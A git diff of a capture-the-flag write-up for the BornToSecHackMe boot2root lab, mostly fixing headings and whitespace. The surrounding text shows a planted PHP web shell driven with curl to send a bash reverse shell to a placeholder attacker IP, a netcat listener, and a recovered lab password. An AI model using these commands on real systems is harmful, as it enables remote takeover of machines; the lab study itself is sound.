@@ -1,9 +1,9 @@
-# reverse shell
+# Reverse shell
 
 Because we have written php code in the file `/var/www/forum/templates_c/cmd.php` to execute any strings in the `cmd` parameter.  
 We can obtain shell without using ssh method.  
 
-## How to create a reverse shell ?
+## How to create a reverse shell
 
 We must use our `attacker machine` to listen on one `port`.
 
@@ -11,7 +11,7 @@ We must use our `attacker machine` to listen on one `port`.
 nc -lvp PORT
 ```
 
-Then the reverse shell command must be sent. In this example we have used `curl`: 
+Then the reverse shell command must be sent. In this example we have used `curl`:
 
 ```bash
 curl --insecure --get https://Boot2rootIP/forum/templates_c/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/AttackerIP/Port 0>&1'"
@@ -34,6 +34,7 @@ lmezard:G!@M6f4Eatau{sF"
 ```
 
 Now we have a shell access we can try to login with `lmezard`. We have a problem and to solve it we must to execute a shell using `TTY` mode (to create an `interactive shell`):
+
 ```bash
 www-data@BornToSecHackMe:/var/www/forum/templates_c$ su lmezard
 su lmezard
